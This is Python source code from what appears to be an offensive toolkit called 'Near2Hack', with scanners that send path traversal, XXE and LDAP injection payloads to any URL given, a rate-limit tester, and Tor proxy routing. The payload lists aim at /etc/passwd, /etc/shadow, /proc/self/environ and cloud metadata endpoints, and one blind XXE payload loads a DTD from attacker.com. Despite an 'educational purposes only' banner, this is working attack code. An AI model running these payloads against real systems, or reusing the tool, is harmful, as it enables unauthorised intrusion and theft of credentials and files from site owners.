class PathTraversalScanner:
    
    # Path Traversal Payloads
    PATH_PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        
        # Absolute paths
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "/etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        
        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        
        # Double URL encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Unicode encoding
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        
        # Null byte injection
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini%00",
        
        # Filter bypass
        "....//....//etc/passwd",
        "..././..././..././etc/passwd",
        "....\\/....\\/windows/win.ini",
        
        # Proc filesystem
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        
        # Common files
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "/etc/hosts",
        "/etc/hostname"
    ]
    
    @staticmethod
    def test_path_traversal(url, timeout=10):
        vulnerable = []
        
        try:
            for payload in PathTraversalScanner.PATH_PAYLOADS:
                test_url = f"{url}?file={payload}"
                try:
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check for file content indicators
                    indicators = [
                        'root:', '/bin/bash', '[extensions]',
                        'for 16-bit app support', 'volume serial number',
                        'localhost', '127.0.0.1'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in indicators:
                        if indicator in content_lower:
                            vulnerable.append({
                                'payload': payload,
                                'indicator': indicator,
                                'status_code': response.status_code
                            })
                            break
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Path Traversal Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        vulnerabilities = PathTraversalScanner.test_path_traversal(target)
        
        if vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Payload", style="red")
            table.add_column("Indicator", style="yellow")
            table.add_column("Status Code", style="cyan")
            
            for vuln in vulnerabilities:
                table.add_row(vuln['payload'], vuln['indicator'], str(vuln['status_code']))
            
            console.print(table)
            console.print(f"[red]Potential path traversal vulnerabilities found: {len(vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious path traversal vulnerabilities detected[/green]")

class XXEScanner:
    
    # XXE Payloads
    XXE_PAYLOADS = [
        # Basic XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
        
        # XXE with parameter entity
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<foo>test</foo>""",
        
        # XXE to retrieve Windows files
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<foo>&xxe;</foo>""",
        
        # XXE with SSRF
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",
        
        # Blind XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
<foo>test</foo>""",
        
        # XXE with PHP wrapper
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>"""
    ]
    
    @staticmethod
    def test_xxe(url, timeout=10):
        vulnerable = []
        
        try:
            for payload in XXEScanner.XXE_PAYLOADS:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = requests.post(url, data=payload, headers=headers, timeout=timeout, verify=False)
                    
                    # Check for XXE indicators
                    indicators = [
                        'root:', '/bin/bash', '[extensions]',
                        'for 16-bit app support', 'aws', 'metadata'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in indicators:
                        if indicator in content_lower:
                            vulnerable.append({
                                'payload_type': 'XXE',
                                'indicator': indicator,
                                'status_code': response.status_code
                            })
                            break
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] XXE Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        vulnerabilities = XXEScanner.test_xxe(target)
        
        if vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Type", style="red")
            table.add_column("Indicator", style="yellow")
            table.add_column("Status Code", style="cyan")
            
            for vuln in vulnerabilities:
                table.add_row(vuln['payload_type'], vuln['indicator'], str(vuln['status_code']))
            
            console.print(table)
            console.print(f"[red]Potential XXE vulnerabilities found: {len(vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious XXE vulnerabilities detected[/green]")

class LDAPInjectionScanner:
    
    # LDAP Injection Payloads
    LDAP_PAYLOADS = [
        # Basic LDAP injection
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin*",
        "admin*)((|userPassword=*",
        
        # Authentication bypass
        "*)(objectClass=*",
        "admin)(&(password=*",
        "*)(|(objectClass=*",
        
        # Blind LDAP injection
        "*)(&(objectClass=*)(objectClass=*",
        "*))%00",
        
        # Filter bypass
        "\\2a",
        "\\28",
        "\\29",
        
        # Boolean-based
        "*)(&(objectClass=*)(cn=*",
        "*)(&(objectClass=user)(cn=*"
    ]
    
    @staticmethod
    def test_ldap_injection(url, timeout=10):
        vulnerable = []
        
        try:
            for payload in LDAPInjectionScanner.LDAP_PAYLOADS:
                test_url = f"{url}?user={payload}"
                try:
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check for LDAP error messages
                    error_patterns = [
                        'ldap', 'javax.naming', 'ldapsearch',
                        'invalid dn syntax', 'ldap_search'
                    ]
                    
                    content_lower = response.text.lower()
                    for pattern in error_patterns:
                        if pattern in content_lower:
                            vulnerable.append({
                                'payload': payload,
                                'pattern': pattern,
                                'url': test_url
                            })
                            break
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] LDAP Injection Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        vulnerabilities = LDAPInjectionScanner.test_ldap_injection(target)
        
        if vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Payload", style="red")
            table.add_column("Error Pattern", style="yellow")
            table.add_column("URL", style="cyan", overflow="fold")
            
            for vuln in vulnerabilities:
                table.add_row(vuln['payload'], vuln['pattern'], vuln['url'])
            
            console.print(table)
            console.print(f"[red]Potential LDAP injection vulnerabilities found: {len(vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious LDAP injection vulnerabilities detected[/green]")

class RateLimitTester:
    TEST_PATHS = ["/", "/login", "/api/", "/admin", "/search", "/register", "/forgot-password", "/reset-password"]

    @staticmethod
    def test_rate_limit(url, requests_count=20, timeout=10):
        import time
        
        results = []
        blocked_at = None
        
        for i in range(requests_count):
            start_time = time.time()
            try:
                response = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
                response_time = (time.time() - start_time) * 1000
                
                results.append({
                    'request_num': i + 1,
                    'status_code': response.status_code,
                    'response_time': response_time
                })
                
                # Check if we're being rate limited
                if response.status_code in [429, 403] and blocked_at is None:
                    blocked_at = i + 1
                
                # Small delay between requests
                time.sleep(0.1)
                
            except Exception:
                results.append({
                    'request_num': i + 1,
                    'status_code': 'ERROR',
                    'response_time': 0
                })
        
        return results, blocked_at

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Rate Limit & WAF Bypass Test for: [cyan]{target}[/cyan][/white]")
        
        rate_limit_results = []
        
        with Progress(SpinnerColumn(), TextColumn("Testing rate limits..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(RateLimitTester.TEST_PATHS))
            
            for path in RateLimitTester.TEST_PATHS:
                test_url = target.rstrip('/') + path
                results, blocked_at = RateLimitTester.test_rate_limit(test_url, requests_count=10)
                
                # Calculate average response time
                valid_times = [r['response_time'] for r in results if r['response_time'] > 0]
                avg_response_time = sum(valid_times) / len(valid_times) if valid_times else 0
                
                rate_limit_results.append({
                    'path': path,
                    'url': test_url,
                    'blocked_at': blocked_at,
                    'avg_response_time': avg_response_time,
                    'total_requests': len(results)
                })
                
                prog.advance(task)
        
        # Display results
        table = Table(show_header=True, header_style="bold white")
        table.add_column("Path", style="cyan")
        table.add_column("Rate Limited", style="white")
        table.add_column("Blocked At Request", style="yellow")
        table.add_column("Avg Response Time", style="green")
        
        rate_limited_paths = []
        
        for result in rate_limit_results:
            if result['blocked_at']:
                rate_limited = "Yes"
                rate_limited_color = "red"
                blocked_at_text = str(result['blocked_at'])
                rate_limited_paths.append(result['path'])
            else:
                rate_limited = "No"
                rate_limited_color = "green"
                blocked_at_text = "N/A"
            
            table.add_row(
                result['path'],
                f"[{rate_limited_color}]{rate_limited}[/{rate_limited_color}]",
                blocked_at_text,
                f"{result['avg_response_time']:.0f}ms"
            )

        console.print(table)

        if rate_limited_paths:
            console.print(f"[red]Rate limiting detected on {len(rate_limited_paths)} path(s)[/red]")
        else:
            console.print("[green]No rate limiting detected[/green]")

class SystemInfo:

    @staticmethod
    def get_system_info():
        info = {}

        try:
            # Basic system info
            info['os'] = platform.system()
            info['os_release'] = platform.release()
            info['os_version'] = platform.version()
            info['architecture'] = platform.machine()
            info['processor'] = platform.processor()
            info['hostname'] = platform.node()

            # Python info
            info['python_version'] = platform.python_version()
            info['python_implementation'] = platform.python_implementation()

            # CPU info
            info['cpu_count'] = psutil.cpu_count(logical=False)
            info['cpu_threads'] = psutil.cpu_count(logical=True)
            info['cpu_freq'] = psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
            info['cpu_percent'] = psutil.cpu_percent(interval=1)

            # Memory info
            mem = psutil.virtual_memory()
            info['total_memory'] = mem.total
            info['available_memory'] = mem.available
            info['memory_percent'] = mem.percent

            # Disk info
            disk = psutil.disk_usage('/')
            info['total_disk'] = disk.total
            info['used_disk'] = disk.used
            info['disk_percent'] = disk.percent

            # Network info
            info['network_interfaces'] = len(psutil.net_if_addrs())

        except Exception as e:
            info['error'] = str(e)

        return info

    @staticmethod
    def format_bytes(bytes_val):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} PB"

    @staticmethod
    def run(target=None):
        console.print(f"[bold cyan]System Information[/bold cyan]\n")

        info = SystemInfo.get_system_info()

        # System table
        sys_table = Table(title="System Details", show_header=True, header_style="bold white")
        sys_table.add_column("Property", style="cyan", width=20)
        sys_table.add_column("Value", style="white")

        sys_table.add_row("Operating System", f"{info.get('os')} {info.get('os_release')}")
        sys_table.add_row("OS Version", info.get('os_version', 'N/A'))
        sys_table.add_row("Architecture", info.get('architecture', 'N/A'))
        sys_table.add_row("Processor", info.get('processor', 'N/A'))
        sys_table.add_row("Hostname", info.get('hostname', 'N/A'))
        sys_table.add_row("Python Version", info.get('python_version', 'N/A'))

        console.print(sys_table)

        # Hardware table
        hw_table = Table(title="Hardware Resources", show_header=True, header_style="bold white")
        hw_table.add_column("Resource", style="cyan", width=20)
        hw_table.add_column("Details", style="white")

        hw_table.add_row("CPU Cores", str(info.get('cpu_count', 'N/A')))
        hw_table.add_row("CPU Threads", str(info.get('cpu_threads', 'N/A')))
        hw_table.add_row("CPU Frequency", f"{info.get('cpu_freq', 'N/A')} MHz" if isinstance(info.get('cpu_freq'), (int, float)) else "N/A")
        hw_table.add_row("CPU Usage", f"{info.get('cpu_percent', 0):.1f}%")

        total_mem = SystemInfo.format_bytes(info.get('total_memory', 0))
        avail_mem = SystemInfo.format_bytes(info.get('available_memory', 0))
        hw_table.add_row("Total Memory", total_mem)
        hw_table.add_row("Available Memory", f"{avail_mem} ({100 - info.get('memory_percent', 0):.1f}% free)")
        hw_table.add_row("Memory Usage", f"{info.get('memory_percent', 0):.1f}%")

        total_disk = SystemInfo.format_bytes(info.get('total_disk', 0))
        used_disk = SystemInfo.format_bytes(info.get('used_disk', 0))
        hw_table.add_row("Total Disk", total_disk)
        hw_table.add_row("Used Disk", f"{used_disk} ({info.get('disk_percent', 0):.1f}%)")

        hw_table.add_row("Network Interfaces", str(info.get('network_interfaces', 'N/A')))

        console.print("\n")
        console.print(hw_table)

        # Proxy status
        console.print("\n")
        proxy_table = Table(title="Proxy Configuration", show_header=True, header_style="bold white")
        proxy_table.add_column("Setting", style="cyan", width=20)
        proxy_table.add_column("Value", style="white")

        proxy_status = "[green]Enabled[/green]" if PROXY_CONFIG["enabled"] else "[red]Disabled[/red]"
        proxy_table.add_row("Status", proxy_status)
        proxy_table.add_row("Type", PROXY_CONFIG["type"])
        proxy_table.add_row("Host", PROXY_CONFIG["host"])
        proxy_table.add_row("Port", str(PROXY_CONFIG["port"]))

        if PROXY_CONFIG["enabled"]:
            is_tor, msg = check_tor_connection()
            tor_status = f"[green]{msg}[/green]" if is_tor else f"[yellow]{msg}[/yellow]"
            proxy_table.add_row("Tor Status", tor_status)

        console.print(proxy_table)

        # Framework info
        console.print("\n")
        console.print(f"[bold green]Near2Hack Framework v2.0[/bold green]")
        console.print(f"[white]Total Modules: [cyan]64+[/cyan][/white]")
        console.print(f"[white]Total Payloads: [cyan]249+[/cyan][/white]")
        console.print(f"[white]Created by: [cyan]emka'thas[/cyan][/white]")

class ProxyManager:

    @staticmethod
    def enable_proxy(proxy_type="socks5", host="127.0.0.1", port=9050):
        PROXY_CONFIG["enabled"] = True
        PROXY_CONFIG["type"] = proxy_type
        PROXY_CONFIG["host"] = host
        PROXY_CONFIG["port"] = port

        console.print(f"[green]Proxy enabled: {proxy_type}://{host}:{port}[/green]")

        # Test connection
        is_tor, msg = check_tor_connection()
        if is_tor:
            console.print(f"[green]✓ {msg}[/green]")
        else:
            console.print(f"[yellow]⚠ {msg}[/yellow]")

    @staticmethod
    def disable_proxy():
        PROXY_CONFIG["enabled"] = False
        console.print("[yellow]Proxy disabled[/yellow]")

    @staticmethod
    def status():
        if PROXY_CONFIG["enabled"]:
            console.print(f"[green]Proxy: {PROXY_CONFIG['type']}://{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}[/green]")
            is_tor, msg = check_tor_connection()
            console.print(f"[white]{msg}[/white]")
        else:
            console.print("[yellow]Proxy is disabled[/yellow]")

